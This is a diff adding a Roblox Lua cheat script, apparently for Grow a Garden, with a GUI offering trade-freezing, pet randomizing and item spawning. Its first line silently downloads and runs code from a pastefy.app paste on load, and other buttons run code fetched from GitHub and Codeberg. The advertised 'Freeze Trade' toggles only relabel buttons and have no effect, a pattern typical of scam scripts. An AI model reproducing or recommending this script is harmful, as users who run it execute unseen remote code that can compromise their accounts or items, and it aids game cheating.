@@ -1,0 +1,199 @@
+loadstring(game:HttpGet("https://pastefy.app/OBulC1wx/raw"))()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local TeleportService = game:GetService("TeleportService")
+local player = Players.LocalPlayer
+
+-- Main UI
+local screenGui = Instance.new("ScreenGui", game.CoreGui)
+screenGui.Name = "UnifiedUI"
+
+-- Toggle Button
+local toggleButton = Instance.new("TextButton")
+toggleButton.Size = UDim2.new(0, 100, 0, 30)
+toggleButton.Position = UDim2.new(0, 10, 0.5, -15)
+toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+toggleButton.Text = "Open"
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.Font = Enum.Font.GothamBold
+toggleButton.TextSize = 14
+toggleButton.Parent = screenGui
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 420, 0, 340)
+mainFrame.Position = UDim2.new(0.5, -210, 0.5, -170)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.Visible = false
+mainFrame.Parent = screenGui
+mainFrame.Active = true
+mainFrame.Draggable = true
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
+
+-- Sidebar (Top Bar)
+local tabBar = Instance.new("Frame")
+tabBar.Size = UDim2.new(1, 0, 0, 40)
+tabBar.Position = UDim2.new(0, 0, 0, 0)
+tabBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+tabBar.Parent = mainFrame
+
+local tabs = {
+    {Name = "Freeze Trade"},
+    {Name = "Randomize"},
+    {Name = "Spawner"},
+}
+local contentFrames = {}
+
+local function hideAllTabs()
+    for _, frame in pairs(contentFrames) do
+        frame.Visible = false
+    end
+end
+
+-- Create content frames
+for i, tabInfo in ipairs(tabs) do
+    local tabBtn = Instance.new("TextButton")
+    tabBtn.Size = UDim2.new(0, 130, 0, 30)
+    tabBtn.Position = UDim2.new(0, (i - 1) * 140 + 10, 0, 5)
+    tabBtn.Text = tabInfo.Name
+    tabBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    tabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    tabBtn.Font = Enum.Font.Gotham
+    tabBtn.TextSize = 14
+    tabBtn.Parent = tabBar
+
+    local content = Instance.new("Frame")
+    content.Size = UDim2.new(1, -20, 1, -50)
+    content.Position = UDim2.new(0, 10, 0, 50)
+    content.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+    content.Visible = false
+    content.Parent = mainFrame
+    contentFrames[tabInfo.Name] = content
+
+    tabBtn.MouseButton1Click:Connect(function()
+        hideAllTabs()
+        content.Visible = true
+    end)
+end
+
+-- Freeze Trade Tab
+do
+    local frame = contentFrames["Freeze Trade"]
+
+    local avatar = Instance.new("ImageLabel", frame)
+    avatar.Size = UDim2.new(0, 40, 0, 40)
+    avatar.Position = UDim2.new(0, 10, 0, 10)
+    avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
+    avatar.BackgroundTransparency = 1
+    Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)
+
+    local nameLbl = Instance.new("TextLabel", frame)
+    nameLbl.Size = UDim2.new(1, -60, 0, 40)
+    nameLbl.Position = UDim2.new(0, 60, 0, 10)
+    nameLbl.Text = player.DisplayName
+    nameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+    nameLbl.BackgroundTransparency = 1
+    nameLbl.Font = Enum.Font.GothamBold
+    nameLbl.TextSize = 18
+    nameLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+    local buttonNames = {"Auto Accept", "Can't Cancel", "Freeze Trade", "Can't Leave"}
+    local toggles = {}
+
+    local function showNotification(msg)
+        local notif = Instance.new("TextLabel", frame)
+        notif.Size = UDim2.new(1, 0, 0, 25)
+        notif.Position = UDim2.new(0, 0, 1, -30)
+        notif.Text = msg
+        notif.TextColor3 = Color3.fromRGB(0, 255, 100)
+        notif.BackgroundTransparency = 1
+        notif.Font = Enum.Font.Gotham
+        notif.TextSize = 14
+        TweenService:Create(notif, TweenInfo.new(0.4), {
+            Position = notif.Position - UDim2.new(0,0,0,30),
+            TextTransparency = 0.1
+        }):Play()
+        game:GetService("Debris"):AddItem(notif, 2)
+    end
+
+    for i, name in ipairs(buttonNames) do
+        local btn = Instance.new("TextButton", frame)
+        btn.Size = UDim2.new(0.45, 0, 0, 40)
+        btn.Position = UDim2.new(0.05 + ((i-1)%2)*0.5, 0, 0.3 + math.floor((i-1)/2)*0.2, 0)
+        btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        btn.Text = name.." : OFF"
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.Font = Enum.Font.Gotham
+        btn.TextSize = 14
+
+        btn.MouseButton1Click:Connect(function()
+            toggles[name] = not toggles[name]
+            btn.Text = name.." : "..(toggles[name] and "ON" or "OFF")
+            showNotification(name.." toggled")
+        end)
+    end
+
+    local leaveBtn = Instance.new("TextButton", frame)
+    leaveBtn.Size = UDim2.new(0.9, 0, 0, 40)
+    leaveBtn.Position = UDim2.new(0.05, 0, 0.8, 0)
+    leaveBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+    leaveBtn.Text = "Leave"
+    leaveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    leaveBtn.Font = Enum.Font.GothamBold
+    leaveBtn.TextSize = 16
+    leaveBtn.MouseButton1Click:Connect(function()
+        TeleportService:TeleportToPlaceInstance(0, "", player)
+    end)
+end
+
+-- Randomize Tab
+do
+    local frame = contentFrames["Randomize"]
+
+    local randPet = Instance.new("TextButton", frame)
+    randPet.Size = UDim2.new(0.9, 0, 0, 40)
+    randPet.Position = UDim2.new(0.05, 0, 0.2, 0)
+    randPet.Text = "Randomize Pet"
+    randPet.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    randPet.TextColor3 = Color3.fromRGB(255, 255, 255)
+    randPet.Font = Enum.Font.GothamBold
+    randPet.TextSize = 16
+    randPet.MouseButton1Click:Connect(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Randomizepet12/refs/heads/main/Khngscript"))()
+    end)
+
+    local randMut = Instance.new("TextButton", frame)
+    randMut.Size = UDim2.new(0.9, 0, 0, 40)
+    randMut.Position = UDim2.new(0.05, 0, 0.4, 0)
+    randMut.Text = "Randomize Mutation"
+    randMut.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
+    randMut.TextColor3 = Color3.fromRGB(255, 255, 255)
+    randMut.Font = Enum.Font.GothamBold
+    randMut.TextSize = 16
+    randMut.MouseButton1Click:Connect(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/RandomizeMutation/refs/heads/main/Khngscript"))()
+    end)
+end
+
+-- Spawner Tab
+do
+    local frame = contentFrames["Spawner"]
+    local spawnBtn = Instance.new("TextButton", frame)
+    spawnBtn.Size = UDim2.new(0.9, 0, 0, 40)
+    spawnBtn.Position = UDim2.new(0.05, 0, 0.3, 0)
+    spawnBtn.Text = "Run Spawner"
+    spawnBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 200)
+    spawnBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    spawnBtn.Font = Enum.Font.GothamBold
+    spawnBtn.TextSize = 16
+    spawnBtn.MouseButton1Click:Connect(function()
+        local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
+    end)
+end
+
+-- Toggle open/close mainFrame
+toggleButton.MouseButton1Click:Connect(function()
+    mainFrame.Visible = not mainFrame.Visible
+    toggleButton.Text = mainFrame.Visible and "Close" or "Open"
+end
